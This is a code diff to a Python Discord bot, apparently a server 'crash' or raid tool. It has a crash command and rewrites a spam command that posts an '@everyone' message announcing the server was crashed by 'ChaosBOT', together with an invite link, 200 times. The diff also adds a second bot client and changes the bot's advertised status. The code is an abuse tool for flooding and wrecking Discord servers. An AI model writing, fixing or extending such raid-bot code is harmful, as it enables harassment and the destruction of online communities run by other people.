@@ -10,6 +10,9 @@ from discord import Webhook, RequestsWebhookAdapter
 client = commands.Bot(command_prefix = settings['PREFIX'], case_insensitive = True, intents = discord.Intents.all())
 client.remove_command('help')
 
+client2 = commands.Bot(command_prefix = 1)
+client2.remove_command('help')
+
 global webhook
 webhook = Webhook.from_url(settings['WEBHOOK'], adapter=RequestsWebhookAdapter())
 
@@ -20,8 +23,12 @@ def localtime():
 
 @client.event
 async def on_ready():
-	await client.change_presence(activity = discord.Game('t!crash | shrk.tk/crashdis'))
+	await client.change_presence(activity = discord.Game('t!crash | .gg/43GtxcFXPK'))
 	print(f'Bot {client.user.name}#{client.user.discriminator} is ready')
+
+@client2.event
+async def on_ready():
+	await client2.change_presence(activity = discord.Game('Бот онлайн!'))
 
 @client.command()
 async def crash(ctx):
@@ -145,12 +152,13 @@ async def crash(ctx):
 	except:
 		print(f'Crash ended. Wenhook send problem\n{start_time} - {end_time}')
 
-@client.command
-async def spam(*, message):
-	for i in range(200):
-		try:
-			client.send_message(channel, '@everyone S3rv3r crash9d by new ChaosBOT!\n\Ссылка на сервер:https://discord.gg/43GtxcFXPK ')
-		except:
-			break
+@client.command(aliases=['spam'])
+async def __spam(ctx):
+  for i in range(200):
+    try:
+      await ctx.send('@everyone S3rv3r crash9d by new ChaosBOT!\n\Ссылка на сервер: https://discord.gg/43GtxcFXPK')
+    except:
+       break 
 
 client.run(settings['TOKEN'])
+client2.run(settings['TOKEN2'])
